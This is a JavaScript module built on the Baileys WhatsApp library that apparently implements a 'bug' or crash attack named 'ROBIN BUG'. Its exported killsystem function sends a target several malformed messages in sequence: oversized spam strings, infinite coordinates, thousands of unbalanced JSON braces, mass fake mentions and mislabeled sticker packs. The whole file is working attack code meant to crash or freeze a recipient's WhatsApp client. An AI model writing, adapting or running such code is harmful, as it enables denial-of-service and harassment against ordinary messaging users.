
const { delay, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

function createSticker(fileName) {
  return {
    fileName,
    isAnimated: false,
    isLottie: true,
    mimetype: "application/pdf",
    emojis: ["🀄"],
    accessibilityLabel: "ROBIN BUG"
  };
}

async function StickerCrash(SYxS7, target) {
  const superSpam = getSuperPayload(20000);
  await SYxS7.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: superSpam,
        publisher: superSpam,
        packDescription: superSpam,
        stickers: Array(10).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp")),
        fileLength: "999999",
        stickerPackSize: "999999999",
        contextInfo: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function U(SYxS7, target) {
    const superSpam = getSuperPayload(30000);
    const up = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1234567891234@newsletter",
        newsletterName: "ROBIN BUG" + superSpam,
        caption: "KILL SYSTEM" + superSpam,
        inviteExpiration: "90000",
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
        }
      }
    };
    await SYxS7.relayMessage(target, up, {
      participant: { jid: target },
      messageId: null
    });
}
        
async function C(SYxS7, target) {
    const superSpam = getSuperPayload(50000);
    await SYxS7.relayMessage(target, {
        locationMessage: {
            degreesLatitude: Infinity,
            degreesLongitude: -Infinity,
            name: "‼️⃟ ༚ ROBIN BUG.   " + superSpam,
            inviteLinkGroupTypeV2: "DEFAULT",
            contextInfo: {
                remoteJid: "@s.whatsapp.net",
                mentionedJid: [target, ...Array.from({ length: 100 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: -Infinity
                    }
                },
                nativeFlowMessage: {
                    messageParamsJson: "{".repeat(10000)
                }
            }
        }
    }, { participant: { jid: target } });
}

async function h(SYxS7, target) {
    const superSpam = getSuperPayload(20000);
    await SYxS7.relayMessage(target, {
        viewOnceMessage: {
            message: {
                extendedMessage: {
                    body: { text: "ROBIN" + superSpam },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "catalog_message",
                            buttonParamsJson: JSON.stringify({ caption: superSpam })
                        }]
                    }
                }
            }
        }
    }, { messageId: null, participant: { jid: target } });
}

async function killsystem(SYxS7, target) {
    try {
        await U(SYxS7, target);
        await delay(500);
        await C(SYxS7, target);
        await delay(500);
        await h(SYxS7, target);
        await delay(500);
        await StickerCrash(SYxS7, target);
    } catch (err) {
        console.error("[killsystem] Error:", err.message);
    }
}

module.exports = { killsystem };
